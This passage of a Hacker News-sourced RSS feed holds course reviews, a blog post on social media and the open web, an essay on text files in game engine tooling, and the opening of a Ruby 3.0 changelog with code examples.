                  <p>This course going into details which are usually if not always omitted by other courses in this category. I liked that the math and actual algorithms were discussed before implementing them and student own problem solving opportunity was encouraged throughout. This course has enabled me to fill in the critical gaps in some of the most important fundamental concepts in 3d graphics programming. Hope to see more!! Thank you.</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="4">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  I wish I had this course at the beginning of my career !
                </h4>
                <h4>N PA</h4>
              </header>
              <section>
                <div>
                  <p>As a self taught programmer (that is now working in the game industry) I wish I had this course at the beginning of my career. I bought it because I want to ...</p>
                  
                    <p><a>
                      Read More
                    </a>
                  
                </p></div>
                <div>
                  <p>As a self taught programmer (that is now working in the game industry) I wish I had this course at the beginning of my career. I bought it because I want to support those kind of materials! I basically learned all this stuff by myself through books and articles, but this course is a all in one place to learn them all at once, in a fun/approachable and motivating way that will make you save some precious time. Even if this is a good refresher for me and I already had the "clicks" before, I'll recommend it for anyone wanting to become a graphics/game/programmer !</p>
                  <p><a>
                    Read Less
                  </a>
                </p></div>
              </section>
            </li>
          
            
            <li data-review-id="5">
              <header>
                <span>
                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                    
                    <i></i>

                  
                </span>
                <h4>
                  Great Course
                </h4>
                <h4>Peter Lous</h4>
              </header>
              <section>
                <div>
                  <p>If you want to …</p></div></section></li></ul></article></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://courses.pikuma.com/courses/learn-computer-graphics-programming">https://courses.pikuma.com/courses/learn-computer-graphics-programming</a></em></p>]]>
            </description>
            <link>https://courses.pikuma.com/courses/learn-computer-graphics-programming</link>
            <guid isPermaLink="false">hacker-news-small-sites-25576462</guid>
            <pubDate>Tue, 29 Dec 2020 23:40:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Did social media kill the open web?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25576149">thread link</a>) | @jmilinovich
<br/>
December 29, 2020 | https://blog.aesthetic.com/blog/is-web-dead/ | <a href="https://web.archive.org/web/*/https://blog.aesthetic.com/blog/is-web-dead/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><div><div><div><p>When mobile apps entered the scene in the early 2010s, sensationalist industry pundits exclaimed, “<a href="https://www.wired.com/2010/08/ff-webrip/">the web is dead!</a>”. A large debate ensued about the role of the web and native apps, and people loved talking about which one would prevail. A decade later it’s clear that the answer is, “both”. It turns out, they weren’t competing in a zero sum game.</p><p>With social media’s rise, we’re now in round 2 of the, “web is dead” argument. There’s a whole new generation of internet users for whom the internet is their social media apps. In the same way that baby boomers viewed the browser as the internet, to Gen Z <a href="https://www.cognizant.com/perspectives/gen-z-the-future-of-the-internet-and-social-platforms">social media is the internet</a>. This isn’t a surprise when looking at recent time spent metrics, but a less obvious and perhaps more consequential shift is happening underneath it all: content creation. </p><p>We estimate that content creation is happening today at roughly 100x the velocity in social media’s walled gardens as it is on the web at large. While there are still <a href="https://www.internetlivestats.com/total-number-of-websites/">100,000+ websites being created each week</a>, there are <a href="https://adespresso.com/blog/instagram-statistics/">100,000,000+ social posts being created</a> across the likes of Instagram, Tiktok and Snapchat. The vast majority of this social content is both temporal (it goes away) and opaque to the rest of the web at large. Social media content is invisible to the web, and is growing far faster. This presents a big risk to the web.</p><p>A <a href="https://www.w3.org/DesignIssues/Principles.html">core tenet of the open internet</a> is that content can be accessed by any device with a network connection. There are protocols and open standards in place that ensure the web stays accessible, and there are massive communities of people whose entire focus is making sure that this vision stays true. However, social media sidesteps all of this and creates its own private ecosystem of content that is only accessible by using a closed protocol (ie, Instagram’s app). This gives them massive control and influence over how and what people discover, and it also means that the open web has a massive hole in it.</p><p>As a content creator today, it’s more important than ever to decide where your allegiances live. What is your primary content creation mechanism, and what channels do you use to distribute it? How does the channel influence the content that you create, and which audience is the most valuable to you and your stakeholders? </p><p>The biggest issue with this new flavor of the web is that the content creators don’t actually own the content they create. Whereas in the open web people host their own content that’s discovered through aggregators like Google, now the content hosting and discovery are bundled together. This means that creators are even more beholden to these platforms and are at risk of having their audience taken away from them. We’ve all read <a href="https://w3-lab.com/social-media/instagram-declining-reach-trends-2020/">horror stories</a> about creators who spent years building an audience, only to have their engagement drop overnight because a platform changed their ranking algorithm to prioritize a new type of content. </p><p>Content creators are more empowered than ever to produce content that reaches their audience, but with this change they are also more captive to the platforms that feed them. This is true for anyone that participates in the social media circus, whether as an individual consumer, creator or a business. </p><p>If the last decade has been a bundling of content creation and distribution, the next decade will be a disaggregation of these two equally important functions. Instead of creators creating content directly within a distribution platform, they will create and host it independently and then syndicate it through their platforms of choice. </p><p>Social media companies are already creating new ways to incentivize content creators to publish on their platform, like what we’ve seen from <a href="https://newsroom.tiktok.com/en-us/introducing-the-200-million-tiktok-creator-fund">TikTok</a> and now <a href="https://www.snap.com/en-US/news/post/introducing-spotlight-on-snapchat/">Snapchat</a>. These incentive structures are attractive at first glance, but also don’t prevent creators from porting their content elsewhere. What will be the open web equivalent of Instagram Stories or TikTok? Google has an opinion on this with <a href="https://amp.dev/about/stories/">AMP Stories</a>, but unfortunately these just end up being, “yet another” thing for creators to think about with no clear payoff outside of large media companies today. </p><p>In the future every creator will have their own content management system that publishes to the web at large, and cross-posts variants of that content to their distribution channels of choice. This has <a href="https://jamstack.org/">already happened with websites</a>, but will continue to grow in use for other formats as well. CMS can be used for many things beyond websites, like <a href="https://unity.com/how-to/simplify-your-content-management-addressables">plugging into gaming engines</a> or <a href="https://www.aesthetic.com/">auto-generating social media assets</a>. Content authoring and content distribution are two sides of the same coin, but don’t have to be coupled. </p><p>At Aesthetic, we’re on the first leg of this journey by helping companies repurpose their website content into social media content. In effect, we’re letting companies tap into their existing CMS to generate social content for all of the platforms they care about. We believe that this is a trend that will continue to play out over time and that will become far more commonplace over the coming years. A higher percentage of the content on social media will be ported from the open web, and used as a bridge to connect creators’ ideas into all of the places that their audiences spend time. </p><p>If you share this vision for the future, <a href="https://www.aesthetic.com/">sign up to get access</a> to Aesthetic today! </p></div></div></div></div></div></div>]]>
            </description>
            <link>https://blog.aesthetic.com/blog/is-web-dead/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25576149</guid>
            <pubDate>Tue, 29 Dec 2020 23:04:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: When Will You Die?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25575959">thread link</a>) | @rrjjww
<br/>
December 29, 2020 | https://www.lifecontingencies.com/home | <a href="https://web.archive.org/web/*/https://www.lifecontingencies.com/home">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.lifecontingencies.com/home</link>
            <guid isPermaLink="false">hacker-news-small-sites-25575959</guid>
            <pubDate>Tue, 29 Dec 2020 22:40:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Text Files Are Underestimated]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25575899">thread link</a>) | @henning
<br/>
December 29, 2020 | https://borjaportugal.com/2020/05/03/text-files-are-understimated/ | <a href="https://web.archive.org/web/*/https://borjaportugal.com/2020/05/03/text-files-are-understimated/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>Computers eat data in binary, that’s a fact, even if we have a text file the computer treats it as binary, zeros and ones. We can agree that binary serialization is the best in terms of disk space and load/save speed. But, what about the quality of life of using them? What about the time needed to add or create new functionality for such files? And the bugs and hard debugging that binary load/saving can give you…</p>



<p>I think that in some cases is best to just stick to text files, at least until other format is needed. It provides several benefits that from my point of view are underestimated.</p>



<h2><strong>Example</strong></h2>



<p>When I was designing the engine for my Junior year at DigiPen Bilbao, the engine that then would run <a href="https://borjaportugal.com/portfolio/teotl-rise-of-a-god/">Teotl – Rise of a God</a>. I wanted to achieve fast iteration time in content creation, this is why I decided to implement hot reloading of resources, which allowed us to see the results of data changes instantly in the engine. If an artist changed a model or texture it would see the change in the running game at the moment.</p>



<p>On top of that, I wanted to achieve fast development time of engine/game features. For this, I decided to avoid implementing some tools and functionality to avoid having to invest the time it would take to develop them in first place and then improving and/or bug-fixing over the duration of the project. <strong>One of the features that we didn’t implement was an Entity Editor.</strong> As we where storing the data in Json format, thanks to the hot reloading of the Resource Manager we could iterate fast on the creation of entities.</p>



<div><figure><img data-attachment-id="1837" data-permalink="https://borjaportugal.com/2020/05/03/text-files-are-understimated/live_edit_teotl_rise_of_a_god/" data-orig-file="https://borjaportugal.files.wordpress.com/2020/05/live_edit_teotl_rise_of_a_god.gif" data-orig-size="1529,706" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="live_edit_teotl_rise_of_a_god" data-image-description="" data-medium-file="https://borjaportugal.files.wordpress.com/2020/05/live_edit_teotl_rise_of_a_god.gif?w=300" data-large-file="https://borjaportugal.files.wordpress.com/2020/05/live_edit_teotl_rise_of_a_god.gif?w=736" src="https://borjaportugal.files.wordpress.com/2020/05/live_edit_teotl_rise_of_a_god.gif" alt="live_edit_teotl_rise_of_a_god"><figcaption>When the text file changes the engine reloads the resource and the changes are visualized live.</figcaption></figure></div>



<p>This choice might seem as lazy, but indeed we didn’t miss this feature at all. Most of the times is not scalable but for us, having limited time to develop a full 3D engine and game, it was a good choice. <strong>A text editor did the job, we didn’t have to spend time working on it and it was 100% reliable, it didn’t crash even once 🙂</strong></p>



<h2><strong>Outsourcing functionality to text editors</strong></h2>



<p>Developing cool tools with cutting edge features is very tempting, I’m always looking for some challenges in my day to day programming. But the truth is that the more cutting edge we try to do something the more time it will take, more code will be needed, more potential for bugs. If we need to create some UI for this feature, we also need to make sure that is intuitive and easy to use for end users.</p>



<p>On the other hand, using text files to represent our data allow us to use them as our editors, inheriting all their features:</p>



<p><strong>* Search:</strong> Instead of creating a database, a text file and Search functionality in text editor does the job (most text editors support regex and other fancy ways of searching, no need to go through the headache of implementing them yourself! : )</p>



<p><strong>* Find and Replace:</strong> Easy to update data.</p>



<p><strong>* Stats:</strong> By using the search functionality you can find out how many times a text appears in the file. That “text” could be the name of a property, the path to a resource… Visual Studio Code highlights on the search bar where the occurrences are, this can also give you data (i.e. in a file where you have a dump of all your levels, you can find out how often a specific mesh is used across levels).</p>



<div><figure><img data-attachment-id="1845" data-permalink="https://borjaportugal.com/2020/05/03/text-files-are-understimated/find_text_editor/" data-orig-file="https://borjaportugal.files.wordpress.com/2020/05/find_text_editor.png" data-orig-size="1047,443" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="find_text_editor" data-image-description="" data-medium-file="https://borjaportugal.files.wordpress.com/2020/05/find_text_editor.png?w=300" data-large-file="https://borjaportugal.files.wordpress.com/2020/05/find_text_editor.png?w=736" src="https://borjaportugal.files.wordpress.com/2020/05/find_text_editor.png" alt="find_text_editor"><figcaption><em>“How often is this model used? I’ll just use Ctrl+F”</em></figcaption></figure></div>



<blockquote><p>We inherit all benefits of text editors! By default!</p><cite>Mike Acton likes things “by default” <sup><a rel="noreferrer noopener" href="https://youtu.be/u8B3j8rqYMw" target="_blank">1</a></sup></cite></blockquote>



<p>All of the above happens by default, without any extra work required from us or any other person in our team. To make it even better, we also get these benefits:</p>



<ul><li>Minor or no need to learn how to use the editor (people is already knows how to use text editors).</li><li>Bug free (hopefully).</li><li>Free lifetime updates with new features they add to the editor that can be handy.</li></ul>



<p>These might sound like they are not much, but taking into account we get them without spending any of our time, they are worth considering.</p>



<h2><strong>Building ‘true’ standalone tools</strong></h2>



<p>Storing the data in binary format makes it tied to the program/API that is producing the data, this means that custom tools we build to work with our data will only work with that, fullstop. It can be “generic” in the context of the project we are working on, but it will be “specific” to that project in the context of other projects.</p>



<p>As programmers we are always looking for ways to make our code as standalone as possible, looking for re-usability. By having our data as text we can build custom tools to search, update, find statistics, etc; that latter can be reused in any other place, because we are just building tools to work with text.</p>



<h3>Batch files</h3>



<p>Sometimes we need to perform operations on several files or even all our files and doing it by hand (in a text editor) is not an option. In those cases we can create some simple batch file that performs the needed operation in all the files we want. By doing this we again have more tools at our disposal like findstr or grep. Once again, by default!</p>



<p><strong>This batch files could be latter reused on other projects, it doesn’t matter if they use plain text, xml, json… they just work with text.</strong></p>



<h3>Programs</h3>



<p>In case we need a more custom operation, we can always create a simple program that would perform it. This program <del>can</del> should be completely standalone from our project, it could be written to work with plain strings or using the API for the format we use (i.e. json/xml). This tools work just with some data and the operations they perform can be reused across any project, it can be a game, an emulator, some other tools or even it could be used to work with code! Isn’t it great?</p>



<h2><strong>Real World Example</strong></h2>



<p>Naugty Dogs uses a lot of text files to develop multiple of their features (i.e. dialog system, animation metadata…).</p>



<p>This saves work on the programmers side because there are no tools to be developed. It might seem like the quality of life of users is decreased because they don’t have a UI to work with, but the truth is that having no tool also means avoiding crashes and potentially loosing work.</p>



<p>If you are interested in this topic, Jason Gregory, exlains how their dialoges are created using Scheme in his book <a href="https://www.gameenginebook.com/" target="_blank" rel="noreferrer noopener">Game Engine Architecture <sup>2</sup></a>. Additionaly, you can see a brief mention of Scheme sintax and how they use it in this talk: <a rel="noopener" href="https://youtu.be/gpINOFQ32o0?t=309" target="_blank">HandmadeCon 2016 – Large-scale Systems Architecture <sup>3</sup></a>.</p>



<h2><strong>Final thoughts</strong></h2>



<p>Sometimes, rather than spending a lot of time thinking on how to build some new tool, is worth asking the question “Would a simple text file do the job?”, if the answer is “Yes” we have the opportunity to save time and open a huge range of possibilities.</p>



<p>I think that most of the times we overlook text files as a viable option, maybe is because using text files feels “naive”, maybe is because the dream idea we have in mind blinds us. We can always find thousands of unrealistic scenarios where “a text file won’t work”, we are always looking for answers to the <em>“What if…”</em> question that will reasure us that we need a super custom fancy tool. <em>“What if…</em></p>



<ul><li><em>… we have too much data? It will be slow.”</em></li><li><em>… we want to compare values? A text file can only search exact matches. Using regex is difficult.”</em></li><li><em>… we mess up the format of the data with a find and replace?”</em></li><li>…</li></ul>



<p>My experience tells me that most of the <em>“What if…”</em> questions we make ourselves don’t turn out to happen, instead, other new problems arise and they need to be solved afterwards. I’ve found the features provided by text editors very useful along my career, if the problem needs a more complex solution, starting with text files as intermediate step shows if an other solution is really needed <sup><a rel="noreferrer noopener" href="https://youtu.be/cV5HArLYajE?t=250" target="_blank">4</a></sup>.</p>



<p><strong>References</strong></p>



<ol><li>When I wrote “We inherit all benefits of text editors! By default!” it was a reference to Mike Acton talk about <a rel="noreferrer noopener" href="https://youtu.be/u8B3j8rqYMw" target="_blank">Performance by Default in Unity</a>.</li><li>Book: <a rel="noreferrer noopener" href="https://www.gameenginebook.com/" target="_blank">Game Engine Architecture</a> by Jason Gregory (chapter about their dialogue system).</li><li><a rel="noopener" href="https://youtu.be/gpINOFQ32o0?t=309" target="_blank">HandmadeCon 2016 – Large-scale Systems Architecture</a>: Jason Gregory explains how they use a Scheme based text format for different purposes.</li><li>Using text files as a first step towards developing a more complex feature is also aligned with on of the rules Mike Acton points out in his <a rel="noreferrer noopener" href="https://youtu.be/cV5HArLYajE?t=250" target="_blank">Everyone Watching This Is Fired</a> talk: <em>“I have implemented my plan B in case my solution to my current problem doesn’t work” -&gt; “I can work with my data in text files in case the Editor doesn’t work or there is no time to finish it”</em>.</li></ol>
			</div></div>]]>
            </description>
            <link>https://borjaportugal.com/2020/05/03/text-files-are-understimated/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25575899</guid>
            <pubDate>Tue, 29 Dec 2020 22:34:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby 3.0 Changes]]>
            </title>
            <description>
<![CDATA[
Score 35 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25575831">thread link</a>) | @mooreds
<br/>
December 29, 2020 | https://rubyreferences.github.io/rubychanges/3.0.html | <a href="https://web.archive.org/web/*/https://rubyreferences.github.io/rubychanges/3.0.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<ul>
  <li><strong>Released at:</strong> Dec 25, 2020 (<a href="https://github.com/ruby/ruby/blob/ruby_3_0/NEWS">NEWS</a> file)</li>
  <li><strong>Status (as of Dec 30, 2020):</strong> Stable, just released</li>
  <li><strong>This document first published:</strong> Dec 25, 2020</li>
  <li><strong>Last change to this document:</strong> Dec 30, 2020</li>
</ul>

<h2 id="highlights">Highlights<a href="#highlights"></a></h2>

<p>Ruby 3.0 is a major language release. The core team worked hard to preserve backward compatibility while delivering some huge and exciting new features.</p>

<ul>
  <li><a href="#keyword-arguments-are-now-fully-separated-from-positional-arguments">Full separation of keyword arguments</a></li>
  <li><a href="#ractors">Ractors</a>: Thread-alike object implementing the actor model, and finally lifting the GVL (Global Virtual machine Lock) and enabling true concurrency</li>
  <li><a href="#non-blocking-fiber-and-scheduler">Non-blocking IO with Fibers</a></li>
  <li><a href="#types">Type declarations</a> (in separate files)</li>
  <li>Pattern matching:
    <ul>
      <li><a href="#pattern-matching">No longer experimental</a></li>
      <li>Two flavors for one-line pattern matching: <a href="#one-line-pattern-matching-with-"><code>=&gt;</code> (aka rightward assignment)</a> and <a href="#in-as-a-truefalse-check"><code>in</code> (aka boolean check)</a></li>
      <li><a href="#find-pattern">Find patterns</a></li>
    </ul>
  </li>
  <li><a href="#endless-method-definition">“Endless” methods</a></li>
  <li><a href="#gcauto_compact-accessor">GC auto-compaction</a></li>
</ul>

<h2 id="language-changes">Language changes<a href="#language-changes"></a></h2>

<h3 id="keyword-arguments-are-now-fully-separated-from-positional-arguments">Keyword arguments are now fully separated from positional arguments<a href="#keyword-arguments-are-now-fully-separated-from-positional-arguments"></a></h3>

<p>The separation which <a href="https://rubyreferences.github.io/rubychanges/2.7.html#keyword-argument-related-changes">started in 2.7</a> with deprecations, is now fully finished. It means  keyword arguments are not a “syntax sugar” on top of hashes, and they never converted into each other implicitly:</p>

<ul>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/14183">Feature #14183</a></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span>def</span> <span>old_style</span><span>(</span><span>name</span><span>,</span> <span>options</span> <span>=</span> <span>{})</span>
<span>end</span>

<span>def</span> <span>new_style</span><span>(</span><span>name</span><span>,</span> <span>**</span><span>options</span><span>)</span>
<span>end</span>

<span>new_style</span><span>(</span><span>'John'</span><span>,</span> <span>{</span><span>age: </span><span>10</span><span>})</span>
<span># Ruby 2.6: works</span>
<span># Ruby 2.7: warns: Using the last argument as keyword parameters is deprecated; maybe ** should be added to the call</span>
<span># Ruby 3.0: ArgumentError (wrong number of arguments (given 2, expected 1))</span>
<span>new_style</span><span>(</span><span>'John'</span><span>,</span> <span>age: </span><span>10</span><span>)</span>
<span># =&gt; works</span>
<span>h</span> <span>=</span> <span>{</span><span>age: </span><span>10</span><span>}</span>
<span>new_style</span><span>(</span><span>'John'</span><span>,</span> <span>**</span><span>h</span><span>)</span>
<span># =&gt; works, ** is mandatory</span>

<span># The last hash argument still allowed to be passed without {}:</span>
<span>old_style</span><span>(</span><span>'John'</span><span>,</span> <span>age: </span><span>10</span><span>)</span>
<span># =&gt; works</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Notes:</strong> There is a <a href="https://www.ruby-lang.org/en/news/2019/12/12/separation-of-positional-and-keyword-arguments-in-ruby-3-0/">big and detailed explanation</a> of the separation reasons, logic, and edge cases on Ruby site, written at the dawn of 2.7, so we will not go into more details here.</li>
</ul>

<h4 id="procs-with-rest-arguments-and-keywords-change-of-autosplatting-behavior">Procs with “rest” arguments and keywords: change of autosplatting behavior<a href="#procs-with-rest-arguments-and-keywords-change-of-autosplatting-behavior"></a></h4>

<p>Just a leftover from the separation of keyword arguments.</p>

<ul>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/16166">Feature #16166</a></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span>block</span> <span>=</span> <span>proc</span> <span>{</span> <span>|*</span><span>args</span><span>,</span> <span>**</span><span>kwargs</span><span>|</span> <span>puts</span> <span>"args=</span><span>#{</span><span>args</span><span>}</span><span>, kwargs=</span><span>#{</span><span>kwargs</span><span>}</span><span>"</span><span>}</span>
<span>block</span><span>.</span><span>call</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>a: </span><span>true</span><span>)</span>
<span># Ruby 2.7: args=[1, 2], kwargs={:a=&gt;true} -- as expected</span>
<span># Ruby 2.7: args=[1, 2], kwargs={:a=&gt;true} -- same</span>
<span>block</span><span>.</span><span>call</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>{</span><span>a: </span><span>true</span><span>})</span>
<span># Ruby 2.7:</span>
<span>#  warning: Using the last argument as keyword parameters is deprecated</span>
<span>#  args=[1, 2], kwargs={:a=&gt;true} -- but extracted to keyword args nevertheless</span>
<span># Ruby 3.0:</span>
<span>#  args=[1, 2, {:a=&gt;true}], kwargs={} -- no attempt to extract hash into keywords, and no error/warning</span>
</code></pre></div>    </div>
  </li>
</ul>

<h3 id="arguments-forwarding--supports-leading-arguments">Arguments forwarding (<code>...</code>) supports leading arguments<a href="#arguments-forwarding--supports-leading-arguments"></a></h3>

<ul>
  <li><strong>Reason:</strong> Argument forwarding, when <a href="https://rubyreferences.github.io/rubychanges/2.7.html#keyword-argument-related-changes">introduced in 2.7</a>, was able to forward only all-or-nothing. It turned out to be not enough. One of the important usages for leading arguments are cases like <code>method_missing</code> and other DSL-defined methods that need to pass to the nested method <code>:some_symbol</code> + all of the original arguments.</li>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/16378">Feature #16378</a></li>
  <li><strong>Documentation:</strong> <a href="https://docs.ruby-lang.org/en/master/doc/syntax/methods_rdoc.html#label-Argument+forwarding"><code>doc/syntax/methods.rdoc</code></a> <em><small>(the link is to a <code>master</code> version, docs were merged post 3.0 release)</small></em></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span>def</span> <span>request</span><span>(</span><span>method</span><span>,</span> <span>url</span><span>,</span> <span>headers: </span><span>{})</span>
  <span>puts</span> <span>"</span><span>#{</span><span>method</span><span>.</span><span>upcase</span><span>}</span><span> </span><span>#{</span><span>url</span><span>}</span><span> (headers=</span><span>#{</span><span>headers</span><span>}</span><span>)"</span>
<span>end</span>

<span>def</span> <span>get</span><span>(</span><span>...</span><span>)</span>
  <span>request</span><span>(</span><span>:get</span><span>,</span> <span>...</span><span>)</span>
<span>end</span>

<span>get</span><span>(</span><span>'https://example.com'</span><span>,</span> <span>headers: </span><span>{</span><span>content_type: </span><span>'json'</span><span>})</span>
<span># GET https://example.com (headers={:content_type=&gt;"json"})</span>

<span># Leading arguments may be present both in the call and in the definition:</span>
<span>def</span> <span>logged_get</span><span>(</span><span>message</span><span>,</span> <span>...</span><span>)</span>
  <span>puts</span> <span>message</span>
  <span>get</span><span>(</span><span>...</span><span>)</span>
<span>end</span>

<span>logged_get</span><span>(</span><span>'Logging'</span><span>,</span> <span>'https://example.com'</span><span>,</span> <span>headers: </span><span>{</span><span>content_type: </span><span>'json'</span><span>})</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Notes:</strong>
    <ul>
      <li>“all arguments splat” <code>...</code> should be the last statement in the argument list (both on a declaration and a call)</li>
      <li>on a method declaration, arguments before <code>...</code> can only be positional (not keyword) arguments, and can’t have default values (it would be <code>SyntaxError</code>);</li>
      <li>on a method call, arguments passed before <code>...</code> can’t be keyword arguments (it would be <code>SyntaxError</code>);</li>
      <li>make sure to check your punctuation thoroughly, because <code>anything ...</code> is a syntax for endless range, those constructs are valid syntax, but would do not what is expected:
        <div><div><pre><code><span>def</span> <span>delegates</span><span>(</span><span>...</span><span>)</span>
  <span># call without "()" -- actually parsed as (p()...)</span>
  <span>p</span> <span>...</span>
  <span># Prints nothing, but warns: warning: ... at EOL, should be parenthesized?</span>

  <span># "," accidentally missing after 1, there is just one argument: 1...</span>
  <span>p</span><span>(</span><span>1</span> <span>...</span><span>)</span>
  <span># Prints "1..."</span>

  <span>p</span><span>(</span><span>1</span><span>,</span> <span>...</span><span>)</span>
  <span># Prints, as expected:</span>
  <span>#   1</span>
  <span>#   5</span>
<span>end</span>

<span>delegates</span><span>(</span><span>5</span><span>)</span>
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
</ul>

<h3 id="endless-method-definition">“Endless” method definition<a href="#endless-method-definition"></a></h3>

<p>Methods of exactly one statement now can be defined with syntax <code>def method() = statement</code>. (The syntax doesn’t need <code>end</code>, hence the “endless definition” moniker.)</p>

<ul>
  <li><strong>Reason:</strong> Ruby’s <code>end</code>s (unlike C-like languages’ <code>{}</code>) are generally OK for Rubyists, but make small utility methods look more heavy than they should. For small utility methods with body containing just one short statement like:
    <div><div><pre><code><span>def</span> <span>available?</span>
  <span>!</span><span>@internal</span><span>.</span><span>empty?</span>
<span>end</span>
</code></pre></div>    </div>
    <p>…the “proper” definition might look so heavy that one will decide against it to leave the class more readable (and instead make class’ clients to just do <code>obj.internal.empty?</code> themselves, making it less semantical). For such cases, a shortcut one-line definition may change the perceiving of utility method creation:</p>
    <div><div><pre><code><span>def</span> <span>available?</span> <span>=</span> <span>!</span><span>@internal</span><span>.</span><span>any?</span>
<span>def</span> <span>finished?</span> <span>=</span> <span>available?</span> <span>&amp;&amp;</span> <span>@internal</span><span>.</span><span>all?</span><span>(</span><span>&amp;</span><span>:finished?</span><span>)</span>
<span>def</span> <span>clear</span> <span>=</span> <span>@internal</span><span>.</span><span>clear</span>
</code></pre></div>    </div>
  </li>
  <li><strong>Discussion:</strong> <a href="https://bugs.ruby-lang.org/issues/16746">Feature #16746</a></li>
  <li><strong>Documentation:</strong> <a href="https://docs.ruby-lang.org/en/master/doc/syntax/methods_rdoc.html"><code>doc/syntax/methods.rdoc</code></a> <em><small>(the link is to a <code>master</code> version, docs were merged post 3.0 release)</small></em></li>
  <li><strong>Code:</strong>
    <div><div><pre><code><span>def</span> <span>dbg</span> <span>=</span> <span>puts</span><span>(</span><span>"DBG: </span><span>#{</span><span>caller</span><span>.</span><span>first</span><span>}</span><span>"</span><span>)</span>

<span>dbg</span>
<span># Prints: DBG: test.rb:3:in `&lt;main&gt;'</span>

<span># The method definition supports all kinds of arguments:</span>
<span>def</span> <span>dbg_args</span><span>(</span><span>a</span><span>,</span> <span>b</span><span>=</span><span>1</span><span>,</span> <span>c</span><span>:,</span> <span>d: </span><span>6</span><span>,</span> <span>&amp;</span><span>block</span><span>)</span> <span>=</span> <span>puts</span><span>(</span><span>"Args passed: </span><span>#{</span><span>[</span><span>a</span><span>,</span> <span>b</span><span>,</span> <span>c</span><span>,</span> <span>d</span><span>,</span> <span>block</span><span>.</span><span>call</span><span>]</span><span>}</span><span>"</span><span>)</span>
<span>dbg_args</span><span>(</span><span>0</span><span>,</span> <span>c: </span><span>5</span><span>)</span> <span>{</span> <span>7</span> <span>}</span>
<span># Prints: Args passed: [0, 1, 5, 6, 7]</span>

<span># For argument definition, () is mandatory</span>
<span>def</span> <span>square</span> <span>x</span> <span>=</span> <span>x</span><span>**</span><span>2</span>
<span># syntax error, unexpected end-of-input -- because Ruby treats it as</span>
<span>#   def square(x = x**2)</span>
<span># ...e.g. an argument with default value, referencing itself, and no method body</span>

<span># This works</span>
<span>def</span> <span>square</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>x</span><span>**</span><span>2</span>
<span>square</span><span>(</span><span>100</span><span>)</span> <span># =&gt; 10000</span>

<span># To avoid confusion, defining method names like #foo= is prohibited</span>
<span>class</span> <span>A</span>
  <span># SyntaxError "setter method cannot be defined in an endless method definition":</span>
  <span>def</span> <span>attr</span><span>=</span><span>(</span><span>val</span><span>)</span> <span>=</span> <span>@attr</span> <span>=</span> <span>val</span>

  <span># Other suffixes are OK:</span>
  <span>def</span> <span>attr?</span><span>()</span> <span>=</span> <span>!!</span><span>@attr</span>
  <span>def</span> <span>attr!</span><span>()</span> <span>=</span> <span>@attr</span> <span>=</span> <span>true</span>
<span>end</span>

<span># funnily enough, operator methods are OK, including #==</span>
<span>class</span> <span>A</span>
  <span>def</span> <span>==</span><span>(</span><span>other</span><span>)</span> <span>=</span> <span>true</span>
<span>end</span>

<span>p</span> <span>A</span><span>.</span><span>new</span> <span>==</span> <span>5</span> <span># =&gt; true</span>

<span># any singular expression can be method body</span>

<span># This works:</span>
<span>def</span> <span>read</span><span>(</span><span>name</span><span>)</span> <span>=</span> <span>File</span><span>.</span><span>read</span><span>(</span><span>name</span><span>)</span>
